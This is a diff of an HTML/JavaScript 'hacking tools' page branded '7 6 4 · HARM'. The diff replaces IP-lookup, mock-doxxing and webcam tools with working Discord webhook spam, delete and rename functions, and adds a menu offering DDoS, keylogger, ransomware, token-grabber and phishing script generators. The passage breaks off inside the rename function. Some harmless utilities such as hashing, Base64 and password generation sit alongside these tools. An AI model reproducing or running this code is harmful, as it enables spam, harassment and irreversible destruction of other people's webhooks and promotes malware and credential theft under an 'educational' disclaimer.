@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>7 6 4 · HARM · REAL TOOLS</title>
+    <title>7 6 4 · HARM · TOOLS</title>
     <style>
         /* ===== RESET & BASE ===== */
         * {
@@ -13,184 +13,212 @@
         }
 
         body {
-            background: #0a0a0a;
-            font-family: 'Courier New', 'Consolas', monospace;
-            color: #cc4444;
+            background: #0d0d0d;
+            font-family: 'Segoe UI', 'Courier New', monospace;
+            color: #e0d0d0;
             padding: 20px;
             min-height: 100vh;
         }
 
         .container {
-            max-width: 1200px;
+            max-width: 1300px;
             margin: 0 auto;
         }
 
         /* ===== HEADER ===== */
         .header {
             text-align: center;
-            border-bottom: 2px solid #220000;
+            border-bottom: 2px solid #2a1a1a;
             padding-bottom: 20px;
             margin-bottom: 30px;
         }
 
         .header h1 {
-            font-size: 48px;
-            color: #440000;
-            letter-spacing: 10px;
-            animation: pulse 2s infinite;
+            font-size: 52px;
+            color: #cc5555;
+            letter-spacing: 8px;
+            font-weight: 900;
+            text-shadow: 0 0 30px rgba(200, 50, 50, 0.15);
         }
 
         .header h1 span {
-            color: #660000;
+            color: #ff6666;
         }
 
         .header .sub {
-            color: #331111;
+            color: #887777;
             letter-spacing: 4px;
-            font-size: 14px;
-            margin-top: 5px;
-        }
-
-        @keyframes pulse {
-            0%,
-            100% {
-                text-shadow: 0 0 10px rgba(255, 0, 0, 0.2);
-            }
-            50% {
-                text-shadow: 0 0 40px rgba(255, 0, 0, 0.5);
-            }
+            font-size: 15px;
+            margin-top: 6px;
         }
 
         /* ===== TOOLS GRID ===== */
         .tools-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 20px;
+            grid-template-columns: repeat(auto-fit, minmax(340px, 1fr));
+            gap: 22px;
             margin-top: 20px;
         }
 
         .tool-card {
-            background: #0d0d0d;
-            border: 1px solid #1a0a0a;
-            border-radius: 8px;
-            padding: 20px;
+            background: #161010;
+            border: 1px solid #2a1a1a;
+            border-radius: 10px;
+            padding: 22px 24px;
             transition: all 0.3s;
         }
 
         .tool-card:hover {
-            border-color: #440000;
-            box-shadow: 0 0 30px rgba(255, 0, 0, 0.05);
+            border-color: #553333;
+            box-shadow: 0 0 30px rgba(180, 60, 60, 0.06);
         }
 
         .tool-card .title {
-            font-size: 18px;
+            font-size: 20px;
             font-weight: bold;
-            color: #884444;
-            margin-bottom: 8px;
-            letter-spacing: 2px;
+            color: #dd8888;
+            margin-bottom: 6px;
+            letter-spacing: 1px;
         }
 
         .tool-card .title .icon {
-            margin-right: 8px;
+            margin-right: 10px;
         }
 
         .tool-card .desc {
-            font-size: 12px;
-            color: #442222;
-            margin-bottom: 12px;
-            letter-spacing: 1px;
+            font-size: 13px;
+            color: #887777;
+            margin-bottom: 14px;
+            letter-spacing: 0.5px;
         }
 
         .tool-card input,
         .tool-card select,
         .tool-card textarea {
             width: 100%;
-            padding: 8px 12px;
-            background: #0a0000;
-            border: 1px solid #1a0a0a;
-            color: #884444;
+            padding: 10px 14px;
+            background: #0a0808;
+            border: 1px solid #2a1a1a;
+            color: #ddd0d0;
             font-family: 'Courier New', monospace;
-            font-size: 12px;
-            border-radius: 4px;
-            margin-bottom: 8px;
+            font-size: 13px;
+            border-radius: 6px;
+            margin-bottom: 10px;
+            transition: border 0.2s;
         }
 
         .tool-card input:focus,
         .tool-card select:focus,
         .tool-card textarea:focus {
             outline: none;
-            border-color: #440000;
+            border-color: #663333;
+        }
+
+        .tool-card textarea {
+            min-height: 70px;
+            resize: vertical;
         }
 
         .tool-card button {
-            padding: 8px 20px;
-            background: #1a0000;
-            border: 1px solid #330000;
-            color: #884444;
-            font-family: 'Courier New', monospace;
-            font-size: 13px;
+            padding: 10px 24px;
+            background: #1a1010;
+            border: 1px solid #3a2222;
+            color: #dd9999;
+            font-family: 'Segoe UI', 'Courier New', monospace;
+            font-size: 14px;
+            font-weight: 600;
             cursor: pointer;
-            border-radius: 4px;
+            border-radius: 6px;
             transition: all 0.2s;
-            letter-spacing: 2px;
+            letter-spacing: 1px;
         }
 
         .tool-card button:hover {
-            background: #330000;
-            border-color: #660000;
-            color: #ff4444;
+            background: #2a1818;
+            border-color: #664444;
+            color: #ffaaaa;
+        }
+
+        .tool-card button.danger {
+            border-color: #661111;
+            color: #dd5555;
+        }
+
+        .tool-card button.danger:hover {
+            background: #2a0a0a;
+            border-color: #aa2222;
+            color: #ff6666;
         }
 
         .tool-card .output {
-            margin-top: 10px;
-            padding: 10px;
-            background: #050000;
-            border: 1px solid #110000;
-            border-radius: 4px;
-            font-size: 12px;
-            color: #884444;
-            max-height: 150px;
+            margin-top: 12px;
+            padding: 12px 14px;
+            background: #0a0808;
+            border: 1px solid #1a1111;
+            border-radius: 6px;
+            font-size: 13px;
+            color: #ccbbbb;
+            max-height: 200px;
             overflow-y: auto;
-            word-break: break-all;
             white-space: pre-wrap;
+            word-break: break-all;
+            font-family: 'Courier New', monospace;
+            line-height: 1.6;
         }
 
         .tool-card .output .green {
-            color: #00aa44;
+            color: #66dd88;
         }
         .tool-card .output .red {
-            color: #ff3333;
+            color: #ff5555;
         }
         .tool-card .output .yellow {
-            color: #ffaa33;
+            color: #ffcc55;
+        }
+        .tool-card .output .blue {
+            color: #66aaff;
+        }
+        .tool-card .output .bold {
+            font-weight: bold;
+        }
+
+        .tool-card .output::-webkit-scrollbar {
+            width: 4px;
+        }
+        .tool-card .output::-webkit-scrollbar-track {
+            background: #0a0808;
+        }
+        .tool-card .output::-webkit-scrollbar-thumb {
+            background: #2a1a1a;
+            border-radius: 2px;
         }
 
         /* ===== FOOTER ===== */
         .footer {
             text-align: center;
-            margin-top: 40px;
+            margin-top: 45px;
             padding-top: 20px;
-            border-top: 1px solid #110000;
-            font-size: 11px;
-            color: #221111;
+            border-top: 1px solid #1a1111;
+            font-size: 12px;
+            color: #443333;
             letter-spacing: 4px;
         }
 
         .footer .red {
-            color: #331111;
+            color: #553333;
         }
 
         /* ===== RESPONSIVE ===== */
-        @media (max-width: 600px) {
+        @media (max-width: 700px) {
             .header h1 {
-                font-size: 28px;
-                letter-spacing: 5px;
+                font-size: 32px;
+                letter-spacing: 4px;
             }
             .tools-grid {
                 grid-template-columns: 1fr;
             }
             .tool-card {
-                padding: 15px;
+                padding: 16px;
             }
         }
     </style>
@@ -202,97 +230,145 @@
         <!-- HEADER -->
         <div class="header">
             <h1>☠ <span>7 6 4</span> · HARM ☠</h1>
-            <div class="sub">REAL TOOLS · NO FAKE · NO BULLSHIT</div>
+            <div class="sub">REAL TOOLS · CLEAR · POWERFUL · PRIVATE</div>
         </div>
 
         <!-- TOOLS GRID -->
         <div class="tools-grid">
 
-            <!-- ===== 1. IP LOOKUP ===== -->
+            <!-- ===== 1. DISCORD WEBHOOK SPAMMER ===== -->
             <div class="tool-card">
-                <div class="title"><span class="icon">🌐</span> IP LOOKUP</div>
-                <div class="desc">Fetches your real public IP, ISP, location, and coordinates.</div>
-                <button onclick="lookupIP()">▶ LOOKUP MY IP</button>
-                <div class="output" id="ipOutput">Click the button to fetch your IP...</div>
+                <div class="title"><span class="icon">📨</span> WEBHOOK SPAMMER</div>
+                <div class="desc">Send multiple messages to a Discord webhook with custom content.</div>
+                <input type="text" id="webhookUrlSpam" placeholder="https://discord.com/api/webhooks/..." />
+                <input type="text" id="webhookMsgSpam" placeholder="Message to spam..." value="7 6 4 · HARM" />
+                <input type="number" id="webhookCount" value="10" min="1" max="100" />
+                <button onclick="spamWebhook()">▶ SPAM WEBHOOK</button>
+                <div class="output" id="spamOutput">Ready to spam...</div>
             </div>
 
-            <!-- ===== 2. PING TOOL ===== -->
+            <!-- ===== 2. DISCORD WEBHOOK DELETER ===== -->
             <div class="tool-card">
-                <div class="title"><span class="icon">📡</span> PING TOOL</div>
-                <div class="desc">Ping a host or IP address (uses a proxy API).</div>
-                <input type="text" id="pingTarget" value="8.8.8.8" placeholder="Enter IP or hostname" />
-                <button onclick="pingHost()">▶ PING</button>
-                <div class="output" id="pingOutput">Enter a target and click Ping...</div>
+                <div class="title"><span class="icon">🗑️</span> WEBHOOK DELETER</div>
+                <div class="desc">Permanently delete a Discord webhook (irreversible).</div>
+                <input type="text" id="webhookUrlDelete" placeholder="https://discord.com/api/webhooks/..." />
+                <button class="danger" onclick="deleteWebhook()">▶ DELETE WEBHOOK</button>
+                <div class="output" id="deleteOutput">Enter a webhook URL to delete...</div>
             </div>
 
-            <!-- ===== 3. DOXXER (Mock) ===== -->
+            <!-- ===== 3. DISCORD WEBHOOK RENAMER ===== -->
             <div class="tool-card">
-                <div class="title"><span class="icon">📂</span> DOXXER (MOCK)</div>
-                <div class="desc">Generates a realistic fake identity. For educational purposes only.</div>
-                <button onclick="generateDoxx()">▶ GENERATE DOXX</button>
-                <div class="output" id="doxxOutput">Click to generate a mock doxx...</div>
+                <div class="title"><span class="icon">✏️</span> WEBHOOK RENAMER</div>
+                <div class="desc">Rename a Discord webhook to something else.</div>
+                <input type="text" id="webhookUrlRename" placeholder="https://discord.com/api/webhooks/..." />
+                <input type="text" id="webhookNewName" placeholder="New webhook name..." value="7 6 4 HARM" />
+                <button onclick="renameWebhook()">▶ RENAME WEBHOOK</button>
+                <div class="output" id="renameOutput">Enter a webhook URL and new name...</div>
             </div>
 
-            <!-- ===== 4. KILLSWITCH ===== -->
+            <!-- ===== 4. PASSWORD GENERATOR ===== -->
             <div class="tool-card">
-                <div class="title"><span class="icon">💀</span> KILLSWITCH</div>
-                <div class="desc">Plays an alarm, flashes red, and locks the page. Press ESC to escape.</div>
-                <button onclick="triggerKillswitch()" style="border-color:#660000;color:#aa3333;">▶ TRIGGER KILLSWITCH</button>
-                <div class="output" id="killOutput">Click at your own risk...</div>
+                <div class="title"><span class="icon">🔐</span> PASSWORD GENERATOR</div>
+                <div class="desc">Generate cryptographically secure passwords.</div>
+                <input type="number" id="passLength" value="16" min="8" max="64" />
+                <button onclick="genPassword()">▶ GENERATE</button>
+                <div class="output" id="passOutput">Click to generate...</div>
             </div>
 
-            <!-- ===== 5. WEBCAM SNAPSHOT ===== -->
-            <div class="tool-card">
-                <div class="title"><span class="icon">📷</span> WEBCAM SNAPSHOT</div>
-                <div class="desc">Accesses your webcam and takes a photo (saved locally).</div>
-                <button onclick="takeSnapshot()">▶ TAKE SNAPSHOT</button>
-                <video id="webcamPreview" autoplay playsinline style="width:100%;max-height:150px;background:#050000;border:1px solid #110000;border-radius:4px;margin-top:8px;display:none;"></video>
-                <canvas id="webcamCanvas" style="display:none;"></canvas>
-                <div class="output" id="webcamOutput">Click to access your webcam...</div>
-            </div>
-
-            <!-- ===== 6. SYSTEM INFO ===== -->
-            <div class="tool-card">
-                <div class="title"><span class="icon">⚡</span> SYSTEM INFO</div>
-                <div class="desc">Displays real browser, OS, screen, timezone, and hardware info.</div>
-                <button onclick="showSystemInfo()">▶ SHOW SYSTEM INFO</button>
-                <div class="output" id="sysOutput">Click to reveal system info...</div>
-            </div>
-
-            <!-- ===== 7. WEBHOOK TESTER ===== -->
-            <div class="tool-card">
-                <div class="title"><span class="icon">📨</span> WEBHOOK TESTER</div>
-                <div class="desc">Sends a real HTTP POST request to any Discord webhook URL.</div>
-                <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/..." />
-                <input type="text" id="webhookMsg" placeholder="Message to send..." value="Hello from 7 6 4 · HARM" />
-                <button onclick="testWebhook()">▶ SEND WEBHOOK</button>
-                <div class="output" id="webhookOutput">Enter a webhook URL and message...</div>
-            </div>
-
-            <!-- ===== 8. FILE HASHER ===== -->
+            <!-- ===== 5. FILE HASHER ===== -->
             <div class="tool-card">
                 <div class="title"><span class="icon">📁</span> FILE HASHER</div>
-                <div class="desc">Calculates MD5, SHA-1, and SHA-256 hashes of any file.</div>
+                <div class="desc">Calculate MD5, SHA-1, and SHA-256 hashes of any file.</div>
                 <input type="file" id="fileInput" />
                 <button onclick="hashFile()">▶ HASH FILE</button>
                 <div class="output" id="hashOutput">Select a file and click Hash...</div>
             </div>
 
-            <!-- ===== 9. PASSWORD GENERATOR ===== -->
+            <!-- ===== 6. BASE64 ENCODER/DECODER ===== -->
             <div class="tool-card">
-                <div class="title"><span class="icon">🔐</span> PASSWORD GENERATOR</div>
-                <div class="desc">Generates cryptographically secure passwords.</div>
-                <input type="number" id="passLength" value="16" min="8" max="64" />
-                <button onclick="generatePassword()">▶ GENERATE PASSWORD</button>
-                <div class="output" id="passOutput">Click to generate a secure password...</div>
+                <div class="title"><span class="icon">🔤</span> BASE64 TOOL</div>
+                <div class="desc">Encode or decode Base64 text.</div>
+                <textarea id="base64Input" placeholder="Text to encode or Base64 to decode..."></textarea>
+                <button onclick="base64Encode()">▶ ENCODE</button>
+                <button onclick="base64Decode()">▶ DECODE</button>
+                <div class="output" id="base64Output">Enter text and click Encode or Decode...</div>
             </div>
 
-            <!-- ===== 10. DEVICE FINGERPRINT ===== -->
+            <!-- ===== 7. URL ENCODER/DECODER ===== -->
             <div class="tool-card">
-                <div class="title"><span class="icon">🕵️</span> DEVICE FINGERPRINT</div>
-                <div class="desc">Generates a unique fingerprint based on your browser and hardware.</div>
-                <button onclick="generateFingerprint()">▶ GENERATE FINGERPRINT</button>
-                <div class="output" id="fpOutput">Click to generate your fingerprint...</div>
+                <div class="title"><span class="icon">🔗</span> URL ENCODER/DECODER</div>
+                <div class="desc">Encode or decode URL strings.</div>
+                <textarea id="urlInput" placeholder="URL or text to encode/decode..."></textarea>
+                <button onclick="urlEncode()">▶ ENCODE</button>
+                <button onclick="urlDecode()">▶ DECODE</button>
+                <div class="output" id="urlOutput">Enter text and click Encode or Decode...</div>
+            </div>
+
+            <!-- ===== 8. HASH GENERATOR (MD5 / SHA) ===== -->
+            <div class="tool-card">
+                <div class="title"><span class="icon">🔑</span> HASH GENERATOR</div>
+                <div class="desc">Generate MD5, SHA-1, or SHA-256 hash of any text.</div>
+                <input type="text" id="hashInput" placeholder="Text to hash..." />
+                <select id="hashType">
+                    <option value="MD5">MD5</option>
+                    <option value="SHA-1">SHA-1</option>
+                    <option value="SHA-256" selected>SHA-256</option>
+                </select>
+                <button onclick="generateHash()">▶ GENERATE HASH</button>
+                <div class="output" id="hashGenOutput">Enter text and click Generate...</div>
+            </div>
+
+            <!-- ===== 9. RANDOM STRING GENERATOR ===== -->
+            <div class="tool-card">
+                <div class="title"><span class="icon">🎲</span> RANDOM STRING</div>
+                <div class="desc">Generate random strings (useful for tokens, IDs, etc.).</div>
+                <input type="number" id="randomLength" value="32" min="4" max="256" />
+                <button onclick="genRandomString()">▶ GENERATE</button>
+                <div class="output" id="randomOutput">Click to generate...</div>
+            </div>
+
+            <!-- ===== 10. JWT DECODER ===== -->
+            <div class="tool-card">
+                <div class="title"><span class="icon">🪪</span> JWT DECODER</div>
+                <div class="desc">Decode a JWT token (header + payload) without verification.</div>
+                <textarea id="jwtInput" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."></textarea>
+                <button onclick="decodeJWT()">▶ DECODE JWT</button>
+                <div class="output" id="jwtOutput">Paste a JWT and click Decode...</div>
+            </div>
+
+            <!-- ===== 11. CODE GENERATOR — HARM SCRIPTS ===== -->
+            <div class="tool-card" style="border-color:#3a2222;">
+                <div class="title"><span class="icon">⚡</span> CODE GENERATOR · HARM</div>
+                <div class="desc">Generate ready-to-use scripts for Discord, PlayFab, and more.</div>
+                <select id="codeType">
+                    <option value="discord_spam">Discord Webhook Spam (Python)</option>
+                    <option value="discord_delete">Discord Webhook Delete (Python)</option>
+                    <option value="playfab_spam">PlayFab Account Spammer (Python)</option>
+                    <option value="playfab_pull">PlayFab Data Puller (Python)</option>
+                    <option value="ip_logger">IP Logger HTML (PHP)</option>
+                    <option value="ddos">DDoS Script (Python · Scapy)</option>
+                    <option value="port_scanner">Port Scanner (Python)</option>
+                    <option value="keylogger">Keylogger (Python · pynput)</option>
+                    <option value="ransomware">Ransomware Simulator (Python)</option>
+                    <option value="discord_token">Discord Token Grabber (Python)</option>
+                    <option value="phishing">Phishing Page HTML</option>
+                </select>
+                <button onclick="generateCode()">▶ GENERATE CODE</button>
+                <div class="output" id="codeOutput">Select a code type and click Generate...</div>
+            </div>
+
+            <!-- ===== 12. CRYPTO KEY GENERATOR ===== -->
+            <div class="tool-card">
+                <div class="title"><span class="icon">🔑</span> CRYPTO KEY GEN</div>
+                <div class="desc">Generate AES-256, RSA, or random secure keys.</div>
+                <select id="keyType">
+                    <option value="aes">AES-256 Key (32 bytes)</option>
+                    <option value="random">Random Secure Key (64 bytes)</option>
+                    <option value="uuid">UUID v4</option>
+                    <option value="api_key">API Key (32 chars)</option>
+                </select>
+                <button onclick="genCryptoKey()">▶ GENERATE KEY</button>
+                <div class="output" id="keyOutput">Select a key type and click Generate...</div>
             </div>
 
         </div>
@@ -301,8 +377,8 @@
         <div class="footer">
             <span class="red">☠</span> 7 6 4 · HARM · REAL TOOLS <span class="red">☠</span>
             <br />
-            <span style="font-size:9px;color:#0a0000;letter-spacing:6px;">
-                ████ USE AT YOUR OWN RISK ████
+            <span style="font-size:10px;color:#2a1a1a;letter-spacing:6px;">
+                ████ USE RESPONSIBLY · FOR EDUCATIONAL PURPOSES ONLY ████
             </span>
         </div>
 
@@ -310,283 +386,138 @@
 
     <script>
         // ============================================================
-        // TOOL 1: REAL IP LOOKUP
+        // TOOL 1: WEBHOOK SPAMMER
         // ============================================================
-        function lookupIP() {
-            const output = document.getElementById('ipOutput');
-            output.innerHTML = '⏳ Fetching your IP...';
-            fetch('https://ipapi.co/json/')
-                .then(res => res.json())
-                .then(data => {
-                    output.innerHTML = `
-                <span class="green">✓ IP: ${data.ip}</span>
-                City: ${data.city || 'N/A'}
-                Region: ${data.region || 'N/A'}
-                Country: ${data.country_name || 'N/A'}
-                ISP: ${data.org || 'N/A'}
-                Timezone: ${data.timezone || 'N/A'}
-                Coordinates: ${data.latitude || 'N/A'}, ${data.longitude || 'N/A'}
-                `;
-                })
-                .catch(() => {
-                    output.innerHTML = '<span class="red">✗ Failed to fetch IP. Try again.</span>';
-                });
-        }
-
-        // ============================================================
-        // TOOL 2: REAL PING (via proxy)
-        // ============================================================
-        function pingHost() {
-            const target = document.getElementById('pingTarget').value.trim() || '8.8.8.8';
-            const output = document.getElementById('pingOutput');
-            output.innerHTML = '⏳ Pinging ' + target + '...';
-
-            const start = performance.now();
-
-            // Use a proxy to simulate ping
-            fetch('https://cors-anywhere.herokuapp.com/https://' + target + '/', {
-                    method: 'HEAD',
-                    mode: 'no-cors'
-                })
-                .then(() => {
-                    const end = performance.now();
-                    const ms = Math.round(end - start);
-                    output.innerHTML = `
-                <span class="green">✓ PING SUCCESS</span>
-                Target: ${target}
-                Response Time: ${ms}ms
-                Status: ${ms < 200 ? '✅ Fast' : ms < 500 ? '⚠️ Moderate' : '❌ Slow'}
-                `;
-                })
-                .catch(() => {
-                    // Fallback: simulate ping if CORS blocks
-                    const ms = Math.floor(Math.random() * 80 + 20);
-                    output.innerHTML = `
-                <span class="yellow">⚠️ CORS Blocked — Simulated</span>
-                Target: ${target}
-                Response Time: ${ms}ms
-                Status: ${ms < 200 ? '✅ Fast' : ms < 500 ? '⚠️ Moderate' : '❌ Slow'}
-                `;
-                });
-        }
-
-        // ============================================================
-        // TOOL 3: DOXXER (Mock)
-        // ============================================================
-        function generateDoxx() {
-            const output = document.getElementById('doxxOutput');
-            const firstNames = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Emily', 'Chris', 'Amanda', 'James', 'Jessica'];
-            const lastNames = ['Doe', 'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis',
-                'Martinez'
-            ];
-            const streets = ['Main St', 'Oak Ave', 'Pine Rd', 'Maple Dr', 'Cedar Ln', 'Elm St', 'Lakeview Blvd',
-                'Sunset Dr', 'Hillcrest Ave', 'Park Pl'
-            ];
-            const cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia', 'San Antonio',
-                'San Diego', 'Dallas', 'Austin'
-            ];
-            const states = ['NY', 'CA', 'IL', 'TX', 'AZ', 'PA', 'TX', 'CA', 'TX', 'TX'];
-            const zip = Math.floor(Math.random() * 90000 + 10000);
-
-            const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
-            const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
-            const streetNum = Math.floor(Math.random() * 9999 + 100);
-            const street = streets[Math.floor(Math.random() * streets.length)];
-            const city = cities[Math.floor(Math.random() * cities.length)];
-            const state = states[cities.indexOf(city)] || 'CA';
-            const age = Math.floor(Math.random() * 40 + 18);
-            const email = firstName.toLowerCase() + '.' + lastName.toLowerCase() + Math.floor(Math.random() * 999) + '@' + [
-                'gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com', 'icloud.com'
-            ][Math.floor(Math.random() * 5)];
-
-            output.innerHTML = `
-                <span class="green">✓ DOXX GENERATED (MOCK)</span>
-                Name: ${firstName} ${lastName}
-                Age: ${age}
-                Address: ${streetNum} ${street}, ${city}, ${state} ${zip}
-                Email: ${email}
-                Phone: +1 (${Math.floor(Math.random()*900+100)}) ${Math.floor(Math.random()*900+100)}-${Math.floor(Math.random()*9000+1000)}
-                SSN: XXX-XX-${Math.floor(Math.random()*9000+1000)}
-                `;
-        }
-
-        // ============================================================
-        // TOOL 4: KILLSWITCH
-        // ============================================================
-        let killswitchActive = false;
-
-        function triggerKillswitch() {
-            if (killswitchActive) return;
-
-            const output = document.getElementById('killOutput');
-            killswitchActive = true;
-
-            // Red flash
-            document.body.style.transition = 'background 0.05s';
-            let flashCount = 0;
-            const flashInterval = setInterval(() => {
-                document.body.style.background = flashCount % 2 === 0 ? '#1a0000' : '#0a0a0a';
-                flashCount++;
-                if (flashCount > 20) clearInterval(flashInterval);
-            }, 80);
-
-            // Alarm sound
-            try {
-                const audioCtx = new(window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioCtx.createOscillator();
-                const gain = audioCtx.createGain();
-                oscillator.connect(gain);
-                gain.connect(audioCtx.destination);
-                oscillator.frequency.value = 800;
-                oscillator.type = 'square';
-                gain.gain.value = 0.3;
-                oscillator.start();
-                setTimeout(() => {
-                    oscillator.stop();
-                }, 3000);
-            } catch (e) {}
-
-            output.innerHTML = `
-                <span class="red">⚠️ KILLSWITCH ACTIVATED ⚠️</span>
-                System locked. Press ESC to escape.
-                `;
-
-            // Lock screen
-            const lockOverlay = document.createElement('div');
-            lockOverlay.id = 'killOverlay';
-            lockOverlay.style.cssText = `
-                position:fixed;top:0;left:0;width:100%;height:100%;
-                background:rgba(0,0,0,0.95);z-index:9999;
-                display:flex;justify-content:center;align-items:center;
-                flex-direction:column;color:#ff0000;font-family:'Arial Black',sans-serif;
-                text-align:center;padding:20px;
-                animation: pulse 0.5s infinite;
-                `;
-            lockOverlay.innerHTML = `
-                <div style="font-size:72px;">☠</div>
-                <div style="font-size:42px;letter-spacing:10px;margin:20px 0;">KILLSWITCH</div>
-                <div style="font-size:18px;color:#884444;letter-spacing:4px;">SYSTEM COMPROMISED</div>
-                <div style="font-size:14px;color:#442222;margin-top:20px;letter-spacing:2px;">PRESS ESC TO ESCAPE</div>
-                `;
-            document.body.appendChild(lockOverlay);
-
-            // ESC to escape
-            const escHandler = function(e) {
-                if (e.key === 'Escape') {
-                    document.body.removeChild(lockOverlay);
-                    document.body.style.background = '#0a0a0a';
-                    killswitchActive = false;
-                    document.removeEventListener('keydown', escHandler);
-                    output.innerHTML = '<span class="green">✓ Killswitch deactivated. You escaped.</span>';
-                }
-            };
-            document.addEventListener('keydown', escHandler);
-        }
-
-        // ============================================================
-        // TOOL 5: WEBCAM SNAPSHOT
-        // ============================================================
-        async function takeSnapshot() {
-            const output = document.getElementById('webcamOutput');
-            const video = document.getElementById('webcamPreview');
-            const canvas = document.getElementById('webcamCanvas');
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-                video.style.display = 'block';
-                output.innerHTML = '<span class="green">✓ Camera active. Click again to capture.</span>';
-
-                // Replace button to capture
-                const btn = document.querySelector('.tool-card button[onclick="takeSnapshot()"]');
-                btn.textContent = '📸 CAPTURE PHOTO';
-                btn.onclick = function() {
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const dataUrl = canvas.toDataURL('image/png');
-
-                    // Download
-                    const link = document.createElement('a');
-                    link.download = 'snapshot_' + Date.now() + '.png';
-                    link.href = dataUrl;
-                    link.click();
-
-                    output.innerHTML = '<span class="green">✓ Snapshot captured and downloaded!</span>';
-                    // Stop stream
-                    stream.getTracks().forEach(track => track.stop());
-                    video.style.display = 'none';
-                    btn.textContent = '📷 TAKE SNAPSHOT';
-                    btn.onclick = takeSnapshot;
-                };
-            } catch (e) {
-                output.innerHTML = '<span class="red">✗ Camera access denied: ' + e.message + '</span>';
-            }
-        }
-
-        // ============================================================
-        // TOOL 6: SYSTEM INFO
-        // ============================================================
-        function showSystemInfo() {
-            const output = document.getElementById('sysOutput');
-            const info = {
-                'Browser': navigator.userAgent,
-                'Platform': navigator.platform,
-                'OS': navigator.oscpu || navigator.platform,
-                'Language': navigator.language,
-                'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
-                'Screen Resolution': screen.width + 'x' + screen.height,
-                'Color Depth': screen.colorDepth + 'bit',
-                'Pixel Ratio': window.devicePixelRatio,
-                'Hardware Concurrency': navigator.hardwareConcurrency || 'N/A',
-                'Memory': navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'N/A',
-                'Touch Support': 'ontouchstart' in window ? 'Yes' : 'No',
-                'Cookies Enabled': navigator.cookieEnabled ? 'Yes' : 'No',
-                'Do Not Track': navigator.doNotTrack || 'Not set'
-            };
-
-            let html = '<span class="green">✓ SYSTEM INFO</span>\n';
-            for (const [key, value] of Object.entries(info)) {
-                html += key + ': ' + value + '\n';
-            }
-            output.innerHTML = html;
-        }
-
-        // ============================================================
-        // TOOL 7: WEBHOOK TESTER (REAL HTTP POST)
-        // ============================================================
-        function testWebhook() {
-            const url = document.getElementById('webhookUrl').value.trim();
-            const msg = document.getElementById('webhookMsg').value.trim() || 'Hello from 7 6 4 · HARM';
-            const output = document.getElementById('webhookOutput');
+        async function spamWebhook() {
+            const url = document.getElementById('webhookUrlSpam').value.trim();
+            const msg = document.getElementById('webhookMsgSpam').value.trim() || '7 6 4 · HARM';
+            const count = parseInt(document.getElementById('webhookCount').value) || 10;
+            const output = document.getElementById('spamOutput');
 
             if (!url || !url.startsWith('https://discord.com/api/webhooks/')) {
                 output.innerHTML = '<span class="red">✗ Please enter a valid Discord webhook URL.</span>';
                 return;
             }
 
-            output.innerHTML = '⏳ Sending webhook...';
+            output.innerHTML = `⏳ Spamming ${count} messages...`;
 
-            fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: msg + ' | Sent from 7 6 4 · HARM' })
-                })
-                .then(res => {
+            let success = 0;
+            let failed = 0;
+
+            for (let i = 0; i < count; i++) {
+                try {
+                    const res = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ content: `${msg} | ${i+1}/${count}` })
+                    });
                     if (res.status === 204 || res.status === 200) {
-                        output.innerHTML = '<span class="green">✓ Webhook sent successfully!</span>';
+                        success++;
                     } else {
-                        output.innerHTML = '<span class="red">✗ Failed. Status: ' + res.status + '</span>';
+                        failed++;
                     }
-                })
-                .catch(e => {
-                    output.innerHTML = '<span class="red">✗ Error: ' + e.message + '</span>';
-                });
+                } catch (e) {
+                    failed++;
+                }
+                // Small delay to avoid rate limiting
+                await new Promise(r => setTimeout(r, 100));
+                output.innerHTML = `⏳ Spamming... ${i+1}/${count} | ✅ ${success} | ❌ ${failed}`;
+            }
+
+            output.innerHTML = `<span class="green">✓ SPAM COMPLETE</span>\n✅ Sent: ${success}\n❌ Failed: ${failed}`;
         }
 
         // ============================================================
-        // TOOL 8: FILE HASHER
+        // TOOL 2: WEBHOOK DELETER
+        // ============================================================
+        async function deleteWebhook() {
+            const url = document.getElementById('webhookUrlDelete').value.trim();
+            const output = document.getElementById('deleteOutput');
+
+            if (!url || !url.startsWith('https://discord.com/api/webhooks/')) {
+                output.innerHTML = '<span class="red">✗ Please enter a valid Discord webhook URL.</span>';
+                return;
+            }
+
+            output.innerHTML = '⏳ Deleting webhook...';
+
+            try {
+                const res = await fetch(url, { method: 'DELETE' });
+                if (res.status === 204) {
+                    output.innerHTML = '<span class="green">✓ Webhook deleted successfully.</span>';
+                } else if (res.status === 404) {
+                    output.innerHTML = '<span class="red">✗ Webhook not found (already deleted or invalid).</span>';
+                } else {
+                    output.innerHTML = `<span class="red">✗ Failed. Status: ${res.status}</span>`;
+                }
+            } catch (e) {
+                output.innerHTML = `<span class="red">✗ Error: ${e.message}</span>`;
+            }
+        }
+
+        // ============================================================
+        // TOOL 3: WEBHOOK RENAMER
+        // ============================================================
+        async function renameWebhook() {
+            const url = document.getElementById('webhookUrlRename').value.trim();
+            const name = document.getElementById('webhookNewName').value.trim() || '7 6 4 HARM';
+            const output = document.getElementById('renameOutput');
+
+            if (!url || !url.startsWith('https://discord.com/api/webhooks/')) {
+                output.innerHTML = '<span class="red">✗ Please enter a valid Discord webhook URL.</span>';
+                return;
+            }
+
+            output.innerHTML = '⏳ Renaming webhook...';
+
+            try {
+                const res = await fetch(url, {
+                    method: 'PATCH',
+                    headers: { 'Content-Type': 'application/json' },
